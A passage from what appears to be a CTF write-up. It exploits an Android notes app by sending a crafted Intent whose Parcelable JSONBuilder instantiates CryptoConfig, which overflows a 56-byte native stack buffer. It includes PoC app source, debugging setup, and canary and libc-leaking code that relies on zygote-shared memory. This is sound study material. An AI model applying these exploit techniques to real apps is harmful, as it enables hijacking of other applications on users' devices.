+</span></span></code></pre></div><p>Now this class is interesting. It is <code>Parcelable</code>, which means that we can pass instances of this class through Intents. It also lucrative from an attacker&rsquo;s perspective. Basically what the <code>JSONBuilder</code> class does is that it allows the user to serialize and deserialize arbitrary objects. So, by crafting a malicious <code>Intent</code> where we pass a <code>JSONBuilder</code> object as extra, we can instantiate arbitrary objects in the target application.</p><p>It is interesting that the <code>JSONBuilder</code> class is never used by the target application, yet we can leverage this class to exploit the target application.</p><h3 id=hello-memory-corruption>Hello memory corruption</h3><p>One class of interest that we can use for instantiation through an Intent containing a <code>JSONBuilder</code> Parcel is the <code>CryptoConfig</code> class:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24.utils;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CryptoConfig</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> ALGO;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String IN;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>native</span> String <span style=color:#a6e22e>docipher</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bArr, String str);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>finalize</span>() <span style=color:#66d9ef>throws</span> Throwable {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>finalize</span>();
+</span></span><span style=display:flex><span>        docipher(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ALGO</span>, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>IN</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The reason that we choose this class is because it has a custom <code>finalize()</code> method and hence it can do some action (<code>docipher()</code>) in the native layer with data that we specify through our Intent. Can we somehow achieve memory corruption by controlling <code>CryptoConfig.ALGO</code> and <code>CryptoConfig.IN</code> while the native <code>docipher</code> is being executed?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>_jstring <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Java_com_inso_ins24_utils_CryptoConfig_docipher</span>(
+</span></span><span style=display:flex><span>    _JNIEnv <span style=color:#f92672>*</span>env,_jclass <span style=color:#f92672>*</span>clz,_jarray <span style=color:#f92672>*</span>algo,_jstring <span style=color:#f92672>*</span>note
+</span></span><span style=display:flex><span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> arr_alg_len;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>algo_str;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>note_c_str;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  note_c_str <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)_JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetStringUTFChars</span>(env,note,NULL);
+</span></span><span style=display:flex><span>  arr_alg_len <span style=color:#f92672>=</span> _JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetArrayLength</span>(env,algo);
+</span></span><span style=display:flex><span>  algo_str <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_algo</span>(env,clz,(_jbyteArray <span style=color:#f92672>*</span>)algo,arr_alg_len);
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>get_algo</span>(_JNIEnv <span style=color:#f92672>*</span>env,_jclass <span style=color:#f92672>*</span>param_2, _jbyteArray <span style=color:#f92672>*</span>arr, <span style=color:#66d9ef>int</span> arr_len) {
+</span></span><span style=display:flex><span>  byte <span style=color:#f92672>*</span>lVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  ulong i;
+</span></span><span style=display:flex><span>  byte buf [<span style=color:#ae81ff>56</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> canary;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  canary <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  lVar1 <span style=color:#f92672>=</span> (byte <span style=color:#f92672>*</span>)_JNIEnv<span style=color:#f92672>::</span><span style=color:#a6e22e>GetByteArrayElements</span>(env,arr, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span>(ulong)(<span style=color:#66d9ef>long</span>)arr_len; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>    buf[i] <span style=color:#f92672>=</span> lVar1[i];
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>) <span style=color:#f92672>==</span> canary) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)buf;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__stack_chk_fail</span>();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>There it is! The <code>get_algo</code> function has a buffer overflow in the for loop that we deemed <em>safe</em> earlier. We are passing an attacker-controlled <code>arr</code> and <code>arr_len</code> (<code>CryptoConfig.ALGO</code>) to the <code>get_algo</code> function. The <code>buf</code> has size 56 bytes only. We can smash the stack!</p><h2 id=exploitation-through-intents>Exploitation through Intents</h2><p>Let&rsquo;s create a minimal PoC application that smashes the stack:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!-- AndroidManifest.xml --&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;manifest</span> <span style=color:#a6e22e>xmlns:android=</span><span style=color:#e6db74>&#34;http://schemas.android.com/apk/res/android&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>xmlns:tools=</span><span style=color:#e6db74>&#34;http://schemas.android.com/tools&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>package=</span><span style=color:#e6db74>&#34;com.example.insomnipwn&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;application</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:icon=</span><span style=color:#e6db74>&#34;@mipmap/ic_launcher&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:label=</span><span style=color:#e6db74>&#34;@string/app_name&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:roundIcon=</span><span style=color:#e6db74>&#34;@mipmap/ic_launcher_round&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:theme=</span><span style=color:#e6db74>&#34;@style/Theme.MyApplication&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;activity</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;.MainActivity&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;intent-filter&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.MAIN&#34;</span> <span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.LAUNCHER&#34;</span> <span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;/intent-filter&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/activity&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/application&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/manifest&gt;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-kotlin data-lang=kotlin><span style=display:flex><span><span style=color:#75715e>//java/com/example/insomnipwn/MainActivity.kt
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>package</span> com.example.insomnipwn
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.Intent
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.os.Bundle
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.util.Log
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.widget.Button
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.widget.Toast
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.appcompat.app.AppCompatActivity
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> com.inso.ins24.utils.CryptoConfig
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> com.inso.ins24.utils.JSONBuilder
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> : AppCompatActivity() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>buildPayload</span>(): ByteArray
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>companion</span> <span style=color:#66d9ef>object</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>init</span> {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>System</span>.loadLibrary(<span style=color:#e6db74>&#34;mynativelib&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onCreate</span>(savedInstanceState: Bundle?) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onCreate(savedInstanceState)
+</span></span><span style=display:flex><span>        setContentView(<span style=color:#a6e22e>R</span>.layout.activity_main)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> pwnButton = findViewById&lt;Button&gt;(<span style=color:#a6e22e>R</span>.id.pwnButton)
+</span></span><span style=display:flex><span>        pwnButton.setOnClickListener {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//Construct the malicious parcelable object
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>val</span> IN = <span style=color:#e6db74>&#34;data&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span> ALGO = buildPayload();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span> evilCryptoConfig = CryptoConfig(ALGO, IN)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span> evilParcelable = JSONBuilder(evilCryptoConfig)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//Send malicious Intent
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>val</span> intent = Intent()
+</span></span><span style=display:flex><span>            intent.setClassName(<span style=color:#e6db74>&#34;com.inso.ins24&#34;</span>, <span style=color:#e6db74>&#34;com.inso.ins24.NoteAPIActivity&#34;</span>)
+</span></span><span style=display:flex><span>            intent.putExtra(<span style=color:#e6db74>&#34;my_first_note&#34;</span>, <span style=color:#e6db74>&#34;Note&#34;</span>)
+</span></span><span style=display:flex><span>            intent.putExtra(<span style=color:#e6db74>&#34;foo&#34;</span>, evilParcelable)
+</span></span><span style=display:flex><span>            startActivity(intent)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Log</span>.i(<span style=color:#e6db74>&#34;[insomnipwn]&#34;</span>,<span style=color:#e6db74>&#34;Intent sent!&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Toast</span>.makeText(<span style=color:#66d9ef>this</span>, <span style=color:#e6db74>&#34;Intent sent!&#34;</span>, <span style=color:#a6e22e>Toast</span>.LENGTH_SHORT).show();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// cpp/main.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;cstdlib&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;jni.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>extern</span> <span style=color:#e6db74>&#34;C&#34;</span>
+</span></span><span style=display:flex><span>JNIEXPORT jbyteArray JNICALL
+</span></span><span style=display:flex><span>Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv <span style=color:#f92672>*</span>env, jobject thiz) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t payload_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload <span style=color:#f92672>=</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*&gt;</span>(calloc(payload_len, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>)));
+</span></span><span style=display:flex><span>    memset(payload, <span style=color:#ae81ff>0x41</span>, payload_len);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    jbyteArray res <span style=color:#f92672>=</span> env<span style=color:#f92672>-&gt;</span>NewByteArray(payload_len);
+</span></span><span style=display:flex><span>    env<span style=color:#f92672>-&gt;</span>SetByteArrayRegion(res, <span style=color:#ae81ff>0</span>, payload_len, <span style=color:#66d9ef>reinterpret_cast</span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>const</span> jbyte <span style=color:#f92672>*&gt;</span>(payload));
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We also need to copy the <code>JSONBuilder</code> and <code>CryptoConfig</code> classes from our target app and place them under the same package name:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// java/com/inso/ins24/utils/CryptoConfig.java</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24.utils;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CryptoConfig</span> {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Implementation omitted. Same as original app */</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// java/com/inso/ins24/utils/JSONBuilder.java</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24.utils;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JSONBuilder</span> <span style=color:#66d9ef>implements</span> Parcelable {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Implementation omitted. Same as original app */</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Let&rsquo;s build our malicious application and run it!</p><p float=middle><img align=top style=display:inline-block src=/post-resources/cryptonotes/pwn-app-main-screen.png width=22%>
+<img align=top style=display:inline-block src=/post-resources/cryptonotes/stack-corruption.png width=77%></p><p>Once we click the &ldquo;PWN!&rdquo; button, the malicious intnet is constructed and sent to the target application. And we have stack corruption! We effectively control <code>pc</code>. Very interesting to see that by simply sending a malicious intent from our application to the target application we are able to completely take control over its execution!</p><p>What is actually happening here under the hood is that:</p><ol><li>We create a <code>JSONBuilder</code> object that contains a <code>CryptoConfig</code> object.</li><li>We create an Intent that is to be delivered to the <code>com.inso.ins24</code> package and more specifically to its <code>.NoteAPIActivity</code> Activity.</li><li>We add the key-value String extra <code>my_first_note=Note</code> to the Intent.</li><li>We serialzie the <code>JSONBuilder</code> object and add it to the Intent under the key <code>foo</code>.</li><li>We send our malicious Intent to the <code>com.inso.ins24</code> package (target app).</li><li>The target application receives our malicious Intent.</li><li>The target application passes the intent to its <code>.NoteAPIActivity</code> Activity. Its <code>onCreate()</code> method is invoked.</li><li>The code <code>getIntent().getStringExtra("my_first_note")</code> in the target activity will force the deserialization of the Intent&rsquo;s objects (<code>unparcel()</code>).</li><li>The <code>JSONBuilder.CREATOR.createFromParcel</code> will be invoked, which in turns invokes the constructor <code>JSONBuilder(parcel)</code>. This method will instantiate a <code>CryptoConfig</code> object from the parcel&rsquo;s JSON data and save it in the <code>JSONBuilder.data</code> instance field.</li><li>We return from <code>getStringExtra()</code> and the control flow in <code>onCreate()</code> continiues. <code>finish()</code> is eventually invoked.</li><li>When <code>finish()</code> is invoked on an Activity, the <code>onDestroy()</code> method of that activity is executed [<a href=https://stackoverflow.com/questions/10847526/what-is-activity-finish-method-doing-exactly/10862977#10862977 target=_blank rel="noopener noreferrer">1</a>], basically indicating that the Activity is no longer needed and should be closed. [<a href=https://developer.android.com/reference/android/app/Activity#finish%28%29 target=_blank rel="noopener noreferrer">2</a>].</li></ol><p>Now the activity will get closed and we will be back to our malicious application. So, when is <code>CryptoConfig.finalize()</code> invoked to trigger our memory corruption?</p><p>Well, this is kind of random. All the parent resources related to the deserialized <code>CryptoConfig</code> instance (e.g. Parcel, Intent, Activity, etc.) are no longer needed as the <code>com.inso.ins24.NoteAPIActivity</code> instance was destroyed. So, it is up to the garbage collector to kick-in and invoke <a href=https://developer.android.com/reference/java/lang/Object#finalize%28%29 target=_blank rel="noopener noreferrer"><code>finalize()</code></a> to clean up the <code>CryptoConfig</code> instance. Once that happens, the <code>docipher(this.ALGO, this.IN)</code> will be executed as part of the overriden implementation of <code>CryptoConfig.finalize()</code> and our memory corruption will finally manifest!</p><h3 id=debugging-environment>Debugging environment</h3><p>Since we are entering the exploitation phase, let&rsquo;s quickly setup our debugging environment. In the emulator, we already have <code>su</code> and do not have to deal with SELinux. We further push <code>frida-server</code> in <code>/data/local/tmp</code>. This small frida snippet can tell us if our intents get delivered as expected:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>Java</span>.<span style=color:#a6e22e>perform</span>(<span style=color:#66d9ef>function</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Java</span>.<span style=color:#a6e22e>use</span>(<span style=color:#e6db74>&#34;com.inso.ins24.NoteAPIActivity&#34;</span>).<span style=color:#a6e22e>onCreate</span>.<span style=color:#a6e22e>implementation</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>a1</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;onCreate invoked&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>onCreate</span>(<span style=color:#a6e22e>a1</span>)
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Hooks initialized&#34;</span>);
+</span></span><span style=display:flex><span>})
+</span></span></code></pre></div><p>Next, we also setup gdb:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find $ANDROID_HOME -name gdbserver | grep android-x86_64
+</span></span><span style=display:flex><span>adb push $ANDROID_HOME/ndk-bundle/prebuilt/android-x86_64/gdbserver/gdbserver /data/local/tmp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>adb shell
+</span></span><span style=display:flex><span>su
+</span></span><span style=display:flex><span>chmod ug+x /data/local/tmp/gdbserver
+</span></span><span style=display:flex><span>/data/local/tmp/gdbserver :7777 --attach <span style=color:#e6db74>`</span>pidof com.inso.ins24<span style=color:#e6db74>`</span>
+</span></span></code></pre></div><p>Next, we run the gdb client on our host machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>adb forward tcp:7777 tcp:7777
+</span></span><span style=display:flex><span>gdb
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> target remote 127.0.0.1:7777
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *get_algo+0xa8
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> <span style=color:#66d9ef>continue</span>
+</span></span></code></pre></div><h3 id=defeating-the-canary>Defeating the canary</h3><p>As shown earlier, we were able to smash the stack through a continious buffer overflow. Yet we do not know the canary. What now?</p><p>Remember our runtime envrionment! We are in Android. More specifically, we are one malicious application trying to pwn another application. All applications in Android are forked from the <code>zygote64</code> process. This process is basically an optimization so that application spawning is fast.</p><p>Since all processes are forked from <code>zygote64</code>, all processes have the same stack canary value (changing canary value after a <code>fork()</code> would be a total mess). Yes, the stack canary is useless in our threat model. We can simply leak the canary value from our own memroy space:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// cpp/main.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define LOG_TAG &#34;[native_insomnipwn]&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;android/log.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ALOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ALOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//apktool d app-debug.apk
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//then, load the libmynativelib.so to Ghidra to validate
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>static</span> <span style=color:#a6e22e>__attribute__</span>((noinline)) __attribute__((optnone))
+</span></span><span style=display:flex><span><span style=color:#66d9ef>uint64_t</span> canaryLeaker() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>canaryPtr <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)(<span style=color:#f92672>&amp;</span>canaryPtr)<span style=color:#f92672>+</span><span style=color:#ae81ff>0x08</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//bunch of prints that should force the canary on the stack
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ALOGI(<span style=color:#e6db74>&#34;canaryLeaker= 0x%llx&#34;</span>, canaryLeaker);
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;JNI_OnLoad= 0x%llx&#34;</span>, JNI_OnLoad);
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;canaryPtr stored @ 0x%llx&#34;</span>, <span style=color:#f92672>&amp;</span>canaryPtr);
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;canary addr= 0x%llx&#34;</span>, canaryPtr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)canaryPtr;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>extern</span> <span style=color:#e6db74>&#34;C&#34;</span>
+</span></span><span style=display:flex><span>JNIEXPORT jbyteArray JNICALL
+</span></span><span style=display:flex><span>Java_com_example_insomnipwn_MainActivity_buildPayload(JNIEnv <span style=color:#f92672>*</span>env, jobject thiz) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> canary <span style=color:#f92672>=</span> canaryLeaker();
+</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;canary= 0x%llx&#34;</span>, canary);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span></code></pre></div><h3 id=leaking-libc>Leaking libc</h3><p>How about leaking libc? Well, there is no need to leak libc from the target application. As all Android applications are forked from <code>zygote64</code> and <code>libc.so</code> is mapped in <code>zygote64</code>, <code>libc.so</code> is mapped in all applications at the same address ranges. So, we can simply read <code>/proc/self/maps</code> to get the base address of <code>libc.so</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// cpp/main.cpp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>ends_with</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>str, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>suffix) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>str <span style=color:#f92672>||</span> <span style=color:#f92672>!</span>suffix)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    size_t lenstr <span style=color:#f92672>=</span> strlen(str);
+</span></span><span style=display:flex><span>    size_t lensuffix <span style=color:#f92672>=</span> strlen(suffix);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (lensuffix <span style=color:#f92672>&gt;</span>  lenstr)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> strncmp(str <span style=color:#f92672>+</span> lenstr <span style=color:#f92672>-</span> lensuffix, suffix, lensuffix) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>uint64_t</span> <span style=color:#a6e22e>libcLeaker</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint64_t</span> libc_base <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> line <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>    size_t line_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
